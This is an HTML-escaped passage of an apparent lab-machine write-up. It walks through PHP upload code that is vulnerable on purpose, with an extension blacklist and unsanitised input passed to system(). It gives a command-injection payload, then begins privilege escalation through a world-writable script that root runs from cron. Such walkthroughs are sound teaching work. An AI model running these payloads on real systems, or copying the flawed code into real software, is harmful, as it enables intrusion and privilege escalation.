    &lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;file&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$file_tmp_name&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;file&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;tmp_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Create the data upload directory&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$upload_directory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;./uploads/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$new_directory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;glob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$upload_directory&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/*&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;GLOB_ONLYDIR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$data_upload_directory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$upload_directory&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$new_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data_upload_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Store the name and the phone number of the user in a txt file&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$user_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Name: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Phone number: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$phone_number&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$save_user_data_command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;echo &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_data&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos; &amp;gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data_upload_directory&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/userinfo.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$save_user_data_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Set the not allowed file extensions&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$not_allowed_file_extensions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// These will be the only file extensions allowed&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Get the file extension&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$file_extension&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;submit&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$not_allowed_file_extensions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If the file extension is not allowed&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;This file looks malicious. Please do not try to hack us.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If the file extension is allowed&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// Try to upload the file&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$file_upload_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data_upload_directory&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$successful_upload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_tmp_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file_upload_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$successful_upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If the upload was successful&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;The file &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; has been uploaded&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If the upload was unsuccessful&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;An error occurred. Please contact the administrator.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The code is is very understandable with the comments so it doesn’t require much explanation, but the vulnerability is in the following line&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Set the not allowed file extensions&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$not_allowed_file_extensions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// These will be the only file extensions allowed&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;because &lt;strong&gt;it is using a blacklist of not allowed extensions&lt;/strong&gt;. It is only blocking the upload of files with &lt;em&gt;php&lt;/em&gt; and &lt;em&gt;sh&lt;/em&gt; extensions but allowing other extensions that are also interpretable by a PHP backend, such as &lt;em&gt;phtml&lt;/em&gt;. That is why &lt;strong&gt;it is recommended to use a whitelist of allowed extensions and if possible other additional measures such as content checking&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Additionally, if we scour the code we can identify another critical vulnerability… can you find it?&lt;/p&gt;

&lt;p&gt;Here it goes. In the following code, which is the one used to save the user’s data in a txt, there is a command injection&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Store the name and the phone number of the user in a txt file&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$user_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Name: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Phone number: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$phone_number&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$save_user_data_command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;echo &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_data&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos; &amp;gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data_upload_directory&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/userinfo.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$save_user_data_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this code the &lt;em&gt;system&lt;/em&gt; function is executed taking as input the user’s data without sanitizing. Therefore, sending the following payload&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HackCommander&apos;;whoami
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the following response is obtained&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-04-08-vulnyx-diff3r3nts3c/command-injection.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The presence of this vulnerability does not affect the difficulty of the machine as this method is more difficult to find and exploit than arbitrary file uploading. This is why the machine remains low.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-privilege-escalation&quot;&gt;3. Privilege escalation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-detecting-the-cronjob-vulnerability&quot;&gt;3.1. Detecting the cronjob vulnerability&lt;/h2&gt;

&lt;p&gt;Taking a look at the candidate user’s home we can see that there is a hidden directory &lt;em&gt;.scripts&lt;/em&gt; with a script named &lt;em&gt;makeBackup.sh&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;/var/www/html
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/candidate
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;/home/candidate
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;total 36
drwx------ 5 candidate candidate 4096 Mar 28 10:56 .
drwxr-xr-x 3 root      root      4096 Mar 28 10:11 ..
drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:53 .backups
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;lrwxrwxrwx 1 root      root         9 Nov 15 10:43 .bash_history -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/dev/null
&lt;span class=&quot;go&quot;&gt;-rw-r--r-- 1 candidate candidate  220 Nov 15 10:23 .bash_logout
-rw-r--r-- 1 candidate candidate 3526 Nov 15 10:23 .bashrc
drwxr-xr-x 3 candidate candidate 4096 Mar 28 10:56 .local
-rw-r--r-- 1 candidate candidate  807 Nov 15 10:23 .profile
drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:57 .scripts
-r-------- 1 candidate candidate   33 Mar 28 10:31 user.txt
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .scripts
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;total 12
drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:57 .
drwx------ 5 candidate candidate 4096 Mar 28 10:56 ..
-rwxrwxrwx 1 candidate candidate  399 Mar 28 10:57 makeBackup.sh
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;makeBackup.sh
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/bash
&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Source folder to be backed up
&lt;span class=&quot;go&quot;&gt;source_folder=&quot;/var/www/html/uploads/&quot;

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Destination folder &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the backup
&lt;span class=&quot;go&quot;&gt;backup_folder=&quot;/home/candidate/.backups/&quot;

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Create backup folder &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;it doesn&lt;span class=&quot;s1&quot;&gt;&apos;t exist
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;mkdir -p &quot;$&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;backup_folder&quot;
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Backup file name
&lt;span class=&quot;gp&quot;&gt;backup_file=&quot;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;backup_folder&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;backup.tar.gz&lt;span class=&quot;s2&quot;&gt;&quot;
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Create a compressed &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;archive of the &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;folder
&lt;span class=&quot;gp&quot;&gt;tar -czf &quot;$&lt;/span&gt;backup_file&lt;span class=&quot;s2&quot;&gt;&quot; -C &quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$source_folder&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; .
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This script is used to backup the directory &lt;em&gt;/var/www/html/uploads/&lt;/em&gt; (the data uploaded by candidates) and save it to the file &lt;em&gt;/home/candidate/.backups/backup.tar.gz&lt;/em&gt;. Backing up is always a good idea and in this case the sysadmin tries to make sure that the data uploaded by the user is safe. One important thing is that the main characteristic of backups is that they are &lt;strong&gt;periodic&lt;/strong&gt; tasks, so it would not be unusual for the machine to have some recurring task configured to run this script. In linux these tasks are called &lt;a href=&quot;https://cronitor.io/guides/cron-jobs&quot;&gt;cronjobs&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We can check which cronjobs the machine has configured as follows&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/etc/crontab: system-wide crontab
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Unlike any other crontab you don&lt;span class=&quot;s1&quot;&gt;&apos;t have to run the `crontab&apos;&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;the new version when you edit this file
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;and files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /etc/cron.d. These files also have username fields,
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;that none of the other crontabs &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Example of job definition:
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;.---------------- minute &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 - 59&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  .------------- hour &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 - 23&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  .---------- day of month &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 - 31&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  |  .------- month &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 - 12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OR jan,feb,mar,apr ...
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  |  |  .---- day of week &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 - 6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sunday&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 or 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OR sun,mon,tue,wed,thu,fri,sat
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;|  |  |  |  |
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; user-name &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to be executed
&lt;span class=&quot;go&quot;&gt;17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;25 6    * * *   root    test -x /usr/sbin/anacron || { cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;* * * * * root /bin/sh /home/candidate/.scripts/makeBackup.sh
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Indeed, there is a line containing a reference to this script&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;* * * * * root /bin/sh /home/candidate/Scripts/makeBackup.sh
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;but it is necessary to understand it. The meaning of each one of the elements of the line is&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The first asterisk indicates the minute of each hour in which the task will be executed. In this case, using an asterisk means that it will be executed every minute.&lt;/li&gt;
  &lt;li&gt;The second asterisk indicates the hour of the day when the task will be executed. When configured with an asterisk, the task will be executed at all hours.&lt;/li&gt;
  &lt;li&gt;The third asterisk indicates the day of the month on which the task will run. Again, when using an asterisk, the task will be executed on all days of the month.&lt;/li&gt;
  &lt;li&gt;The fourth asterisk indicates the month in which the task will be executed. When set with an asterisk, the task will be executed in all months.&lt;/li&gt;
  &lt;li&gt;The fifth asterisk indicates the day of the week on which the task will be executed. When using an asterisk, the task will be executed on all days of the week (Monday through Sunday).&lt;/li&gt;
